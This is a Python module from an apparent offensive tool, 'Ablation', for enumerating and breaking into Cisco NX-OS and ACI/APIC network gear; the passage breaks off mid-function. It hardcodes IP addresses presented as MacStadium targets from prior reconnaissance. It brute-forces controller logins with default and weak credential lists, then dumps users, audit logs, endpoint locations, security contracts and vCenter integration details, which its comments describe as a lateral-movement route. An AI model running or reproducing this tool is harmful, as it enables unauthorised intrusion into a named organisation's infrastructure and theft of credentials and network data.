"""Cisco NX-OS, ACI/APIC, and VXLAN enumeration for Ablation."""

import json
import socket
import struct
import subprocess
import re
import urllib.request
import urllib.error
import ssl
import base64
from typing import Optional

# APIC REST API base paths
APIC_API_BASE = "/api"
APIC_LOGIN_PATH = "/api/aaaLogin.json"
APIC_LIST_DOMAINS_PATH = "/api/aaaListDomains.json"   # unauthenticated
APIC_LIST_DOMAIN_PATH = "/api/aaaListDomain.json"
APIC_REFRESH_PATH = "/api/aaaRefresh.json"
APIC_LOGOUT_PATH = "/api/aaaLogout.json"

# MIT class query endpoints — all require auth unless noted
APIC_CLASSES = {
    # Fabric topology
    "fabric_nodes":       "/api/node/class/fabricNode.json",
    "top_system":         "/api/node/class/topSystem.json",
    # Tenant / policy model
    "tenants":            "/api/node/class/fvTenant.json",
    "app_profiles":       "/api/node/class/fvAp.json",
    "epgs":               "/api/node/class/fvAEPg.json",
    "bridge_domains":     "/api/node/class/fvBD.json",
    "vrfs":               "/api/node/class/fvCtx.json",
    "bd_subnets":         "/api/node/class/fvSubnet.json",
    # Contracts (security policy)
    "contracts":          "/api/node/class/vzBrCP.json",      # contract objects
    "contract_subjects":  "/api/node/class/vzSubj.json",       # subjects inside contracts
    "contract_filters":   "/api/node/class/vzFilter.json",     # filter objects
    "filter_entries":     "/api/node/class/vzEntry.json",      # L4 entries (port/proto)
    "contract_prov":      "/api/node/class/fvRsProv.json",     # EPG -> contract provided
    "contract_cons":      "/api/node/class/fvRsCons.json",     # EPG -> contract consumed
    # External connectivity (L3Out)
    "l3out":              "/api/node/class/l3extOut.json",     # L3Out objects
    "l3out_node_prof":    "/api/node/class/l3extLNodeP.json",  # logical node profiles
    "l3out_ext_epg":      "/api/node/class/l3extInstP.json",   # external EPGs / prefixes
    "l3out_subnets":      "/api/node/class/l3extSubnet.json",  # external subnets
    "bgp_peers":          "/api/node/class/bgpPeerP.json",     # BGP peer adjacencies
    # VMM integration (lateral movement surface)
    "vmm_domains":        "/api/node/class/vmmDomP.json",      # VMM domain (vCenter/OpenStack/K8s)
    "vmm_controllers":    "/api/node/class/vmmCtrlrP.json",    # VMM controller (holds vCenter IP)
    "vmm_cred":           "/api/node/class/vmmUsrAccP.json",   # VMM credentials (vCenter username)
    # AAA / user management
    "users":              "/api/node/class/aaaUser.json",
    "aaa_domains":        "/api/node/class/aaaDomain.json",
    "user_roles":         "/api/node/class/aaaRbacRule.json",
    # Audit and logging
    "audit_log":          "/api/node/class/aaaModLR.json",     # configuration change audit log
    "event_log":          "/api/node/class/aaaEpLR.json",      # endpoint event log
    # Endpoint tracking
    "ep_learn":           "/api/node/class/fvCEp.json",        # learned endpoints (MAC/IP/location)
    "ep_to_path":         "/api/node/class/fvRsCEpToPathEp.json",  # endpoint physical location
    # Fabric health / faults
    "fault_summary":      "/api/node/class/faultSummary.json",
    "fault_inst":         "/api/node/class/faultInst.json",
    # Physical domains and VLAN pools
    "physical_domain":    "/api/node/class/physDomP.json",
    "vlan_pools":         "/api/node/class/fvnsVlanInstP.json",
    # VXLAN
    "vxlan_vnids":        "/api/node/class/fvnsVxlanInstP.json",
    "nve_peers":          "/api/node/class/tunnelIf.json",
    # Firmware / version
    "firmware_running":   "/api/node/class/firmwareRunning.json",  # per-node running firmware
    "firmware_repo":      "/api/node/class/firmwareRepoP.json",    # firmware repository images
    # Licensing
    "licenses":           "/api/node/class/licenseEntL.json",
}

# APIC-specific fabric node query with firmware attributes
APIC_FABRICNODE_WITH_FW = (
    "/api/node/class/fabricNode.json"
    "?query-target=self"
    "&rsp-subtree=full"
    "&rsp-subtree-class=firmwareRunning"
)

# Fabric-wide firmware status
APIC_FIRMWARE_STATUS = (
    "/api/node/class/topSystem.json"
    "?query-target=self"
    "&rsp-subtree=full"
    "&rsp-subtree-class=firmwareRunning"
)

# Audit log — last 200 change records
APIC_AUDIT_LOG_PATH = "/api/node/class/aaaModLR.json?order-by=aaaModLR.created|desc&page-size=200"

# L3Out external EPGs with subnets (subtree query)
APIC_L3OUT_FULL = (
    "/api/node/class/l3extOut.json"
    "?query-target=subtree"
    "&target-subtree-class=l3extInstP,l3extSubnet,bgpPeerP,ospfExtP"
)

# EPG-to-EPG contract matrix: provided and consumed together
APIC_CONTRACT_MATRIX_PATH = (
    "/api/node/class/fvAEPg.json"
    "?query-target=subtree"
    "&target-subtree-class=fvRsProv,fvRsCons"
)

# VMM domain full subtree (includes controller IP and credential reference)
APIC_VMM_FULL_PATH = (
    "/api/node/class/vmmDomP.json"
    "?query-target=subtree"
    "&target-subtree-class=vmmCtrlrP,vmmUsrAccP,vmmVSwitchPolicyCont"
)

# Endpoint tracker — all learned endpoints with physical location
APIC_CEP_WITH_PATH = (
    "/api/node/class/fvCEp.json"
    "?query-target=subtree"
    "&target-subtree-class=fvRsCEpToPathEp"
    "&order-by=fvCEp.modTs|desc"
    "&page-size=500"
)

# Cobra SDK download path (self-hosted on APIC — no internet required)
APIC_COBRA_DOWNLOAD = "/cobra/_downloads/"

# NX-OS NETCONF port
NETCONF_PORT = 830

# NX-OS management ports
NXOS_PORTS = {
    22:   "SSH",
    23:   "Telnet (disabled by default)",
    443:  "HTTPS (NXAPI / DCNM)",
    830:  "NETCONF/SSH",
    8080: "NXAPI HTTP",
    8443: "NXAPI HTTPS",
    9443: "DCNM HTTPS",
}

# APIC-specific ports
APIC_PORTS = {
    80:   "APIC HTTP (redirects)",
    443:  "APIC HTTPS REST API",
    7777: "APIC Appliance Director",
}

# NX-OS CLI commands for SSH-based enumeration
NXOS_ENUM_COMMANDS = [
    "show version",
    "show hostname",
    "show license host-id",
    "show license usage",
    "show vdc",
    "show users",
    "show aaa",
    "show tacacs-server",
    "show radius-server",
    "show ip interface brief",
    "show interface mgmt0",
    "show running-config | section aaa",
    "show running-config | section username",
    "show nve peers",
    "show nve vni",
    "show bgp l2vpn evpn summary",
    "show vlan",
    "show cdp neighbors",
    "show lldp neighbors",
    "show environment",
    "show inventory",
]

# Default credentials for NX-OS — no hardcoded default password;
# admin password is set at first boot. These are common weak passwords.
NXOS_DEFAULT_CREDS = [
    ("admin", "admin"),
    ("admin", "Admin1234!"),
    ("admin", "cisco"),
    ("admin", "cisco123"),
    ("admin", "Cisco123!"),
    ("admin", "password"),
    ("admin", ""),
    ("cisco", "cisco"),
]

# APIC-specific default credentials.
# ins3965! — Cisco factory default set during APIC first-boot wizard
#             before the operator completes setup (CIMC/iDRAC stage).
# C1sco12345 — common Cisco TAC / lab default; appears in CVE PoCs
#              and older APIC installation guides.
# cisco123   — used in Cisco official training materials (Zero to Hero,
#              CCNP ACI) as the canonical demo password.
# admin/password — CIMC (Cisco IMC) default before setup wizard completion.
APIC_DEFAULT_CREDS = [
    ("admin", "ins3965!"),
    ("admin", "C1sco12345"),
    ("admin", "cisco123"),
    ("admin", "cisco"),
    ("admin", "Admin1234!"),
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", ""),
]

# MacStadium-specific APIC/NX-OS targets inferred from network recon
MACSTADIUM_CISCO_TARGETS = [
    {"ip": "207.254.14.1",  "role": "nxos-switch",      "site": "atl"},  # confirmed OU=dcnxos nginx/1.7.10
    {"ip": "207.254.14.2",  "role": "apic-candidate",  "site": "atl"},
    {"ip": "207.254.14.3",  "role": "apic-candidate",  "site": "atl"},
    {"ip": "207.254.14.4",  "role": "apic-candidate",  "site": "atl"},
    {"ip": "207.254.14.10", "role": "nxos-leaf",        "site": "atl"},
    {"ip": "207.254.14.11", "role": "nxos-leaf",        "site": "atl"},
    {"ip": "207.254.14.20", "role": "nxos-spine",       "site": "atl"},
    {"ip": "207.254.14.21", "role": "nxos-spine",       "site": "atl"},
]

# SSL context that skips cert validation
_SSL_CTX = ssl.create_default_context()
_SSL_CTX.check_hostname = False
_SSL_CTX.verify_mode = ssl.CERT_NONE


def classify_by_cert_ou(host: str, port: int = 443, timeout: float = 5.0) -> dict:
    """
    Discriminate NX-OS switch vs APIC controller by TLS cert OU field.
    Both expose /api/aaaLogin.json (APIC-Cookie framework) — the cert is the
    only reliable discriminator without attempting auth.

    OU=dcnxos  → NX-OS switch  (NX-API at /api/aaaLogin.json)
    OU=dcapic  → APIC controller (APIC REST at /api/aaaLogin.json)

    # MacStadium: 207.254.14.1 confirmed OU=dcnxos (NX-OS 9.x)
    """
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode    = ssl.CERT_NONE
    result = {
        'host':        host,
        'port':        port,
        'ou':          'unknown',
        'cn':          '',
        'org':         '',
        'device_type': 'UNKNOWN',
        'raw_cert':    {},
        'error':       None,
    }
    try:
        with socket.create_connection((host, port), timeout=timeout) as sock:
            with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                # binary_form=True works for self-signed expired certs where
                # getpeercert(binary_form=False) returns empty dict
                cert_der = ssock.getpeercert(binary_form=True)
                ou = cn = org = ''
                if cert_der:
                    try:
                        pem = ssl.DER_cert_to_PEM_cert(cert_der)
                        out = subprocess.check_output(
                            ['openssl', 'x509', '-subject', '-noout'],
                            input=pem.encode(), stderr=subprocess.DEVNULL, timeout=5
                        ).decode()
                        # subject= C = US, ST = CA, O = Cisco, OU = dcnxos, CN = nxos
                        for part in out.split(','):
                            part = part.strip()
                            if part.startswith('OU =') or part.startswith('OU='):
                                ou = part.split('=', 1)[1].strip().lower()
                            elif part.startswith('CN =') or part.startswith('CN='):
                                cn = part.split('=', 1)[1].strip()
                            elif part.startswith('O =') or (part.startswith('O=') and not part.startswith('OU')):
                                org = part.split('=', 1)[1].strip()
                    except Exception:
                        # openssl not available — fall back to DER ASN.1 string scan
                        text = cert_der.decode('latin-1')
                        if 'dcnxos' in text:
                            ou = 'dcnxos'
                        elif 'dcapic' in text:
                            ou = 'dcapic'
                result['ou']  = ou or 'unknown'
                result['cn']  = cn
                result['org'] = org
                if ou == 'dcnxos':
                    result['device_type'] = 'NXOS_SWITCH'
                elif ou == 'dcapic':
                    result['device_type'] = 'APIC_CONTROLLER'
                else:
                    result['device_type'] = 'UNKNOWN'
    except Exception as e:
        result['error'] = str(e)
    return result


def _apic_get(apic_host: str, path: str, token: Optional[str] = None,
              timeout: int = 8) -> Optional[dict]:
    url = f"https://{apic_host}{path}"
    headers = {"Content-Type": "application/json"}
    if token:
        headers["Cookie"] = f"APIC-cookie={token}"
    try:
        req = urllib.request.Request(url, headers=headers)
        with urllib.request.urlopen(req, context=_SSL_CTX, timeout=timeout) as r:
            return json.loads(r.read().decode())
    except Exception:
        return None


def _apic_post(apic_host: str, path: str, body: dict,
               token: Optional[str] = None, timeout: int = 8) -> Optional[dict]:
    url = f"https://{apic_host}{path}"
    headers = {"Content-Type": "application/json"}
    if token:
        headers["Cookie"] = f"APIC-cookie={token}"
    data = json.dumps(body).encode()
    try:
        req = urllib.request.Request(url, data=data, headers=headers, method="POST")
        with urllib.request.urlopen(req, context=_SSL_CTX, timeout=timeout) as r:
            return json.loads(r.read().decode())
    except Exception:
        return None


def probe_apic_unauthenticated(apic_host: str) -> dict:
    """Probe APIC for unauthenticated surface (aaaListDomains)."""
    result = {
        "host": apic_host,
        "reachable": False,
        "aaa_domains": [],
        "raw_domains_response": None,
    }

    # TCP probe first
    try:
        sock = socket.create_connection((apic_host, 443), timeout=5)
        sock.close()
        result["reachable"] = True
    except Exception:
        return result

    # Unauthenticated: list AAA domains
    resp = _apic_get(apic_host, APIC_LIST_DOMAINS_PATH)
    if resp:
        result["raw_domains_response"] = resp
        try:
            imdata = resp.get("imdata", [])
            for item in imdata:
                for cls, attrs in item.items():
                    domain_name = attrs.get("attributes", {}).get("name", "")
                    if domain_name:
                        result["aaa_domains"].append(domain_name)
        except Exception:
            pass

    return result


def apic_login(apic_host: str, username: str, password: str) -> Optional[str]:
    """Login to APIC and return auth token, or None."""
    body = {"aaaUser": {"attributes": {"name": username, "pwd": password}}}
    resp = _apic_post(apic_host, APIC_LOGIN_PATH, body)
    if not resp:
        return None
    try:
        token = resp["imdata"][0]["aaaLogin"]["attributes"]["token"]
        return token
    except (KeyError, IndexError):
        return None


def apic_brute_creds(apic_host: str) -> dict:
    """Try common NX-OS/APIC credential pairs against APIC login.

    Tries APIC_DEFAULT_CREDS first (APIC-specific), then NXOS_DEFAULT_CREDS.
    APIC factory default is admin/ins3965! before setup wizard completes.
    """
    result = {"success": False, "username": None, "password": None, "token": None}
    for user, pwd in (APIC_DEFAULT_CREDS + NXOS_DEFAULT_CREDS):
        token = apic_login(apic_host, user, pwd)
        if token:
            result["success"] = True
            result["username"] = user
            result["password"] = pwd
            result["token"] = token
            break
    return result


def apic_enumerate(apic_host: str, token: str) -> dict:
    """Full APIC MIT enumeration with valid auth token.

    Queries all MIT classes in APIC_CLASSES, then runs targeted subtree
    queries for contract matrix, L3Out networks, VMM domains, audit log,
    firmware state, and endpoint tracker.
    """
    findings = {
        "host": apic_host,
        "token": token[:24] + "...",
        "classes": {},
        "summary": {},
    }

    for key, path in APIC_CLASSES.items():
        resp = _apic_get(apic_host, path, token=token)
        if resp and "imdata" in resp:
            items = resp["imdata"]
            findings["classes"][key] = items
            findings["summary"][key] = len(items)
        else:
            findings["classes"][key] = []
            findings["summary"][key] = 0

    # Extract VTEPs from fabric nodes with firmware
    vteps = []
    for node in findings["classes"].get("fabric_nodes", []):
        attrs = list(node.values())[0].get("attributes", {})
        address = attrs.get("address", "")
        role = attrs.get("role", "")
        dn = attrs.get("dn", "")
        if address:
            vteps.append({"address": address, "role": role, "dn": dn})
    findings["vteps"] = vteps

    # Firmware version per node (separate query with subtree)
    findings["firmware"] = apic_get_firmware_versions(apic_host, token)

    # Extract tenant names
    tenants = []
    for t in findings["classes"].get("tenants", []):
        attrs = list(t.values())[0].get("attributes", {})
        tenants.append(attrs.get("name", ""))
    findings["tenant_names"] = [t for t in tenants if t]

    # Extract usernames with roles and login timestamps
    users = []
    for u in findings["classes"].get("users", []):
        attrs = list(u.values())[0].get("attributes", {})
        users.append({
            "name": attrs.get("name", ""),
            "domain": attrs.get("domain", ""),
            "role": attrs.get("roledn", ""),
            "last_login": attrs.get("lastLoginTime", ""),
            "phone": attrs.get("phone", ""),
            "email": attrs.get("email", ""),
        })
    findings["users"] = users

    # EPG-to-EPG contract matrix
    findings["contract_matrix"] = apic_get_contract_matrix(apic_host, token)

    # L3Out external network enumeration
    findings["l3out_networks"] = apic_get_l3out_networks(apic_host, token)

    # VMM domain enumeration (lateral movement: vCenter/OpenStack/K8s creds)
    findings["vmm_domains"] = apic_get_vmm_domains(apic_host, token)

    # Audit log (last 200 changes — admin activity, cred resets, topology mods)
    findings["audit_log"] = apic_get_audit_log(apic_host, token)

    # Endpoint tracker (learned MAC/IP with physical location)
    findings["endpoints"] = apic_get_endpoints(apic_host, token)

    # SSH authorized_keys check (APIC runs CentOS; admin has shell access)
    findings["ssh_keys"] = apic_check_ssh_keys(apic_host, token)

    # Fabric nodes with firmware versions (enhanced — role/serial/model per node)
    findings["fabric_nodes_enriched"] = apic_get_fabric_nodes(apic_host, token)

    # VMM providers (vCenter/OpenStack/K8s integration with controller IPs)
    findings["vmm_providers"] = apic_get_vmm_providers(apic_host, token)

    # Service graph device clusters (L4-L7 appliances)
    findings["service_graphs"] = apic_get_service_graphs(apic_host, token)

    # Tenants with health scores
    findings["tenants_enriched"] = apic_get_tenants(apic_host, token)

    # Contracts with L4 filter entries (flag any-any permit)
    findings["contracts_enriched"] = apic_get_contracts(apic_host, token)
    findings["permit_all_contracts"] = [
        c for c in findings["contracts_enriched"] if c.get("permit_all")
    ]

    # X.509 cert auth capability probe
    findings["cert_auth"] = apic_cert_auth(apic_host, "admin", "")

    # Out-of-band management IP assignments per node
    findings["oob_mgmt"] = apic_get_out_of_band_mgmt(apic_host, token)

    # Config export check (list existing policies; trigger only if none exist)
    findings["config_export"] = apic_export_config(apic_host, token)

    return findings


def apic_get_firmware_versions(apic_host: str, token: str) -> list:
    """Query per-node running firmware version via fabricNode + firmwareRunning subtree.

    fabricNode.json attributes include: address, role, id, dn, model, serial.
    firmwareRunning (child) adds: version, ts (timestamp).
    Also queries topSystem for APIC controller nodes (role=controller).
    """
    results = []

    # Path: fabricNode with firmware child objects
    path = (
        "/api/node/class/fabricNode.json"
        "?rsp-subtree=full"
        "&rsp-subtree-class=firmwareRunning"
    )
    resp = _apic_get(apic_host, path, token=token)
    if resp and "imdata" in resp:
        for item in resp["imdata"]:
            attrs = list(item.values())[0].get("attributes", {})
            children = list(item.values())[0].get("children", [])
            fw_ver = ""
            fw_ts = ""
            for child in children:
                if "firmwareRunning" in child:
                    fw_attrs = child["firmwareRunning"].get("attributes", {})
                    fw_ver = fw_attrs.get("version", "")
                    fw_ts = fw_attrs.get("ts", "")
            results.append({
                "dn": attrs.get("dn", ""),
                "address": attrs.get("address", ""),
                "role": attrs.get("role", ""),
                "model": attrs.get("model", ""),
                "serial": attrs.get("serial", ""),
                "fw_version": fw_ver,
                "fw_ts": fw_ts,
            })

    return results


def apic_get_contract_matrix(apic_host: str, token: str) -> dict:
    """Extract EPG-to-EPG contract matrix.

    Maps each EPG DN -> list of provided contracts and consumed contracts.
    Contract name resolves to vzBrCP which contains vzSubj -> vzFilter -> vzEntry
    (port/protocol L4 entries). This gives the full security policy topology:
    who can talk to whom and on which ports.

    Matrix format: {epg_dn: {provided: [...], consumed: [...]}}
    """
    matrix: dict = {}

    # Provided contracts per EPG
    resp = _apic_get(apic_host, "/api/node/class/fvRsProv.json", token=token)
    if resp and "imdata" in resp:
        for item in resp["imdata"]:
            attrs = item.get("fvRsProv", {}).get("attributes", {})
            epg_dn = attrs.get("dn", "").rsplit("/rsprov-", 1)[0]
            contract = attrs.get("tnVzBrCPName", "") or attrs.get("tDn", "")
            state = attrs.get("state", "")
            if epg_dn:
                matrix.setdefault(epg_dn, {"provided": [], "consumed": []})
                matrix[epg_dn]["provided"].append({"contract": contract, "state": state})

    # Consumed contracts per EPG
    resp = _apic_get(apic_host, "/api/node/class/fvRsCons.json", token=token)
    if resp and "imdata" in resp:
        for item in resp["imdata"]:
            attrs = item.get("fvRsCons", {}).get("attributes", {})
            epg_dn = attrs.get("dn", "").rsplit("/rscons-", 1)[0]
            contract = attrs.get("tnVzBrCPName", "") or attrs.get("tDn", "")
            state = attrs.get("state", "")
            if epg_dn:
                matrix.setdefault(epg_dn, {"provided": [], "consumed": []})
                matrix[epg_dn]["consumed"].append({"contract": contract, "state": state})

    # Pull contract filter entries (L4 port/proto rules) for context
    filter_entries: dict = {}
    resp = _apic_get(apic_host, "/api/node/class/vzEntry.json", token=token)
    if resp and "imdata" in resp:
        for item in resp["imdata"]:
            attrs = item.get("vzEntry", {}).get("attributes", {})
            filter_dn = attrs.get("dn", "").rsplit("/e-", 1)[0]
            filter_entries.setdefault(filter_dn, [])
            filter_entries[filter_dn].append({
                "name": attrs.get("name", ""),
                "ethertype": attrs.get("etherT", ""),
                "proto": attrs.get("prot", ""),
                "dst_from": attrs.get("dFromPort", ""),
                "dst_to": attrs.get("dToPort", ""),
            })

    return {"epg_contract_matrix": matrix, "filter_entries": filter_entries}


def apic_get_l3out_networks(apic_host: str, token: str) -> list:
    """Enumerate L3Out external network configurations.

    L3Out (l3extOut) is the ACI construct connecting the fabric to external
    routed networks. Each L3Out contains:
      - l3extLNodeP: logical node profiles (which leaf nodes participate)
      - l3extInstP: external EPG — defines which external prefixes are allowed
      - l3extSubnet: specific IP prefixes with scope (external/shared/export)
      - bgpPeerP: BGP peer adjacencies (reveals upstream routers)

    This is a high-value target: L3Out misconfigs leak internal prefixes
    externally and external prefixes into wrong VRFs.
    """
    results = []

    path = (
        "/api/node/class/l3extOut.json"
        "?query-target=subtree"
        "&target-subtree-class=l3extInstP,l3extSubnet,l3extLNodeP,bgpPeerP,ospfExtP"
    )
    resp = _apic_get(apic_host, path, token=token)
    if not resp or "imdata" not in resp:
        # Fallback: flat queries for each class
        l3outs_raw = _apic_get(apic_host, "/api/node/class/l3extOut.json", token=token)
        ext_epg_raw = _apic_get(apic_host, "/api/node/class/l3extInstP.json", token=token)
        subnet_raw = _apic_get(apic_host, "/api/node/class/l3extSubnet.json", token=token)
        bgp_raw = _apic_get(apic_host, "/api/node/class/bgpPeerP.json", token=token)

        l3outs_by_dn: dict = {}
        if l3outs_raw and "imdata" in l3outs_raw:
            for item in l3outs_raw["imdata"]:
                attrs = item.get("l3extOut", {}).get("attributes", {})
                dn = attrs.get("dn", "")
                l3outs_by_dn[dn] = {
                    "dn": dn,
                    "name": attrs.get("name", ""),
                    "tenant": dn.split("/")[1].replace("tn-", "") if "/tn-" in dn else "",
                    "vrf": attrs.get("tnFvCtxName", ""),
                    "enforce_rtctrl": attrs.get("enforceRtctrl", ""),
                    "ext_epgs": [],
                    "subnets": [],
                    "bgp_peers": [],
                }
        if ext_epg_raw and "imdata" in ext_epg_raw:
            for item in ext_epg_raw["imdata"]:
                attrs = item.get("l3extInstP", {}).get("attributes", {})
                dn = attrs.get("dn", "")
                # parent L3Out DN: strip /instP-<name>
                parent = "/".join(dn.split("/")[:-1])
                if parent in l3outs_by_dn:
                    l3outs_by_dn[parent]["ext_epgs"].append({
                        "name": attrs.get("name", ""),
                        "dn": dn,
                    })
        if subnet_raw and "imdata" in subnet_raw:
            for item in subnet_raw["imdata"]:
                attrs = item.get("l3extSubnet", {}).get("attributes", {})
                dn = attrs.get("dn", "")
                # grandparent is instP; great-grandparent is l3extOut
                parts = dn.split("/")
                l3out_dn = "/".join(parts[:3])  # uni/tn-X/out-Y
                if l3out_dn in l3outs_by_dn:
                    l3outs_by_dn[l3out_dn]["subnets"].append({
                        "ip": attrs.get("ip", ""),
                        "scope": attrs.get("scope", ""),  # external/shared/export-rtctrl
                        "aggregate": attrs.get("aggregate", ""),
                    })
        if bgp_raw and "imdata" in bgp_raw:
            for item in bgp_raw["imdata"]:
                attrs = item.get("bgpPeerP", {}).get("attributes", {})
                dn = attrs.get("dn", "")
                parts = dn.split("/")
                l3out_dn = "/".join(parts[:3])
                if l3out_dn in l3outs_by_dn:
                    l3outs_by_dn[l3out_dn]["bgp_peers"].append({
                        "addr": attrs.get("addr", ""),
                        "remote_asn": attrs.get("peerT", "") or attrs.get("ctrl", ""),
                    })
        results = list(l3outs_by_dn.values())
        return results

    # Parse subtree response
    current: dict = {}
    for item in resp["imdata"]:
        cls_name = list(item.keys())[0]
        attrs = item[cls_name].get("attributes", {})
        dn = attrs.get("dn", "")
        if cls_name == "l3extOut":
            current_dn = dn
            current[current_dn] = {
                "dn": dn,
                "name": attrs.get("name", ""),
                "tenant": dn.split("/")[1].replace("tn-", "") if "tn-" in dn else "",
                "vrf": attrs.get("tnFvCtxName", ""),
                "ext_epgs": [],
                "subnets": [],
                "bgp_peers": [],
            }
        elif cls_name == "l3extInstP":
            l3out_dn = "/".join(dn.split("/")[:3])
            if l3out_dn in current:
                current[l3out_dn]["ext_epgs"].append({
                    "name": attrs.get("name", ""), "dn": dn})
        elif cls_name == "l3extSubnet":
            l3out_dn = "/".join(dn.split("/")[:3])
            if l3out_dn in current:
                current[l3out_dn]["subnets"].append({
                    "ip": attrs.get("ip", ""),
                    "scope": attrs.get("scope", ""),
                    "aggregate": attrs.get("aggregate", ""),
                })
        elif cls_name == "bgpPeerP":
            l3out_dn = "/".join(dn.split("/")[:3])
            if l3out_dn in current:
                current[l3out_dn]["bgp_peers"].append({
                    "addr": attrs.get("addr", ""),
                })

    return list(current.values())


def apic_get_vmm_domains(apic_host: str, token: str) -> list:
    """Enumerate VMM domains — lateral movement surface.

    VMM integration connects APIC to hypervisor management planes:
      - VMware vCenter (vmmCtrlrP.hostOrIp = vCenter IP/hostname,
        vmmUsrAccP.name = vCenter username stored in APIC)
      - Microsoft SCVMM
      - OpenStack Neutron
      - Kubernetes (via ACI CNI acc-provision)

    Exposures:
      1. vCenter IP and username disclosed in vmmCtrlrP/vmmUsrAccP objects.
      2. APIC stores vCenter credentials — extracting them enables direct
         vCenter API access (lateral movement from network admin to VM admin).
      3. K8s integration creates a dedicated ACI CNI user with leaf-scope
         admin; compromising APIC grants that user's token.
      4. Port groups managed by APIC in vCenter are named after ACI EPGs —
         direct mapping of the security segmentation model.
    """
    results = []

    path = (
        "/api/node/class/vmmDomP.json"
        "?query-target=subtree"
        "&target-subtree-class=vmmCtrlrP,vmmUsrAccP"
    )
    resp = _apic_get(apic_host, path, token=token)
    if not resp or "imdata" not in resp:
        # Fallback: flat class queries
        dom_resp = _apic_get(apic_host, "/api/node/class/vmmDomP.json", token=token)
        ctrl_resp = _apic_get(apic_host, "/api/node/class/vmmCtrlrP.json", token=token)
        acc_resp = _apic_get(apic_host, "/api/node/class/vmmUsrAccP.json", token=token)

        domains: dict = {}
        if dom_resp and "imdata" in dom_resp:
            for item in dom_resp["imdata"]:
                attrs = item.get("vmmDomP", {}).get("attributes", {})
                dn = attrs.get("dn", "")
                domains[dn] = {
                    "name": attrs.get("name", ""),
                    "dn": dn,
                    "provider": attrs.get("type", "VMware"),
                    "controllers": [],
                    "credentials": [],
                }
        if ctrl_resp and "imdata" in ctrl_resp:
            for item in ctrl_resp["imdata"]:
                attrs = item.get("vmmCtrlrP", {}).get("attributes", {})
                dn = attrs.get("dn", "")
                parent_dn = "/".join(dn.split("/")[:-1])
                if parent_dn in domains:
                    domains[parent_dn]["controllers"].append({
                        "name": attrs.get("name", ""),
                        "host_or_ip": attrs.get("hostOrIp", ""),
                        "datacenter": attrs.get("rootContName", ""),
                        "mode": attrs.get("mode", ""),
                        "dvs_version": attrs.get("dvsVersion", ""),
                        "scope": attrs.get("scope", ""),
                        "stats_mode": attrs.get("statsMode", ""),
                    })
        if acc_resp and "imdata" in acc_resp:
            for item in acc_resp["imdata"]:
                attrs = item.get("vmmUsrAccP", {}).get("attributes", {})
                dn = attrs.get("dn", "")
                parent_dn = "/".join(dn.split("/")[:-1])
                if parent_dn in domains:
                    domains[parent_dn]["credentials"].append({
                        "name": attrs.get("name", ""),
                        "usr": attrs.get("usr", ""),
                        # password attribute exists but is masked in API output
                        "pwd_set": bool(attrs.get("pwd", "")),
                    })
        results = list(domains.values())
        return results

    # Parse subtree response
    domains: dict = {}
    for item in resp["imdata"]:
        cls_name = list(item.keys())[0]
        attrs = item[cls_name].get("attributes", {})
        dn = attrs.get("dn", "")
        if cls_name == "vmmDomP":
            domains[dn] = {
                "name": attrs.get("name", ""),
                "dn": dn,
                "provider": attrs.get("type", "VMware"),
                "controllers": [],
                "credentials": [],
            }
        elif cls_name == "vmmCtrlrP":
            parent_dn = "/".join(dn.split("/")[:-1])
            if parent_dn in domains:
                domains[parent_dn]["controllers"].append({
                    "name": attrs.get("name", ""),
                    "host_or_ip": attrs.get("hostOrIp", ""),
                    "datacenter": attrs.get("rootContName", ""),
                    "mode": attrs.get("mode", ""),
                    "dvs_version": attrs.get("dvsVersion", ""),
                })
        elif cls_name == "vmmUsrAccP":
            parent_dn = "/".join(dn.split("/")[:-1])
            if parent_dn in domains:
                domains[parent_dn]["credentials"].append({
                    "name": attrs.get("name", ""),
                    "usr": attrs.get("usr", ""),
                    "pwd_set": bool(attrs.get("pwd", "")),
                })

    return list(domains.values())


def apic_get_audit_log(apic_host: str, token: str,
                       page_size: int = 200) -> list:
    """Extract APIC configuration change audit log (aaaModLR).

    Each aaaModLR record captures: who changed what, when, from which IP,
    and what the previous vs new value was. High-value for:
      - Identifying admin accounts and their source IPs
      - Detecting recent credential changes (pwd field changes)
      - Reconstructing topology changes before/after an incident
      - Finding automation accounts by pattern (frequent API-sourced changes)
    """
    path = (
        f"/api/node/class/aaaModLR.json"
        f"?order-by=aaaModLR.created|desc"
        f"&page-size={page_size}"
    )
    resp = _apic_get(apic_host, path, token=token)
    if not resp or "imdata" not in resp:
        return []

    records = []
    for item in resp["imdata"]:
        attrs = item.get("aaaModLR", {}).get("attributes", {})
        records.append({
            "dn": attrs.get("dn", ""),
            "user": attrs.get("user", ""),
            "action": attrs.get("action", ""),         # created/modified/deleted
            "affected_dn": attrs.get("affected", ""),  # which object was changed
            "descr": attrs.get("descr", ""),
            "change_set": attrs.get("changeSet", ""),  # old -> new attribute values
            "client_ip": attrs.get("clientRemoteAddr", "") or attrs.get("sessionId", ""),
            "created": attrs.get("created", ""),
            "id": attrs.get("id", ""),
        })
    return records


def apic_get_endpoints(apic_host: str, token: str,
                       page_size: int = 500) -> list:
    """Query learned endpoint table (fvCEp) — MAC/IP/location/EPG.

    fvCEp is populated by the COOP (Council of Oracle Protocols) database
    on spine nodes. Each entry reveals:
      - MAC address of the endpoint
      - IP address (if known)
      - Which EPG the endpoint belongs to (via dn hierarchy)
      - Physical location: pod/node/port (via fvRsCEpToPathEp child)
      - Encapsulation VLAN ID

    Lateral movement use: enumerate all VMs/containers by IP + EPG membership
    to map the full workload topology without touching the compute layer.
    """
    path = (
        f"/api/node/class/fvCEp.json"
        f"?order-by=fvCEp.modTs|desc"
        f"&page-size={page_size}"
        f"&rsp-subtree=full"
        f"&rsp-subtree-class=fvRsCEpToPathEp,fvIp"
    )
    resp = _apic_get(apic_host, path, token=token)
    if not resp or "imdata" not in resp:
        return []

    endpoints = []
    for item in resp["imdata"]:
        attrs = item.get("fvCEp", {}).get("attributes", {})
        children = item.get("fvCEp", {}).get("children", [])
        dn = attrs.get("dn", "")

        # Extract EPG from DN: uni/tn-X/ap-Y/epg-Z/cep-MAC
        epg_dn = "/".join(dn.split("/")[:4]) if dn.count("/") >= 4 else ""

        paths = []
        extra_ips = []
        for child in children:
            if "fvRsCEpToPathEp" in child:
                path_attrs = child["fvRsCEpToPathEp"].get("attributes", {})
                paths.append(path_attrs.get("tDn", ""))
            elif "fvIp" in child:
                ip_attrs = child["fvIp"].get("attributes", {})
                extra_ips.append(ip_attrs.get("addr", ""))

        endpoints.append({
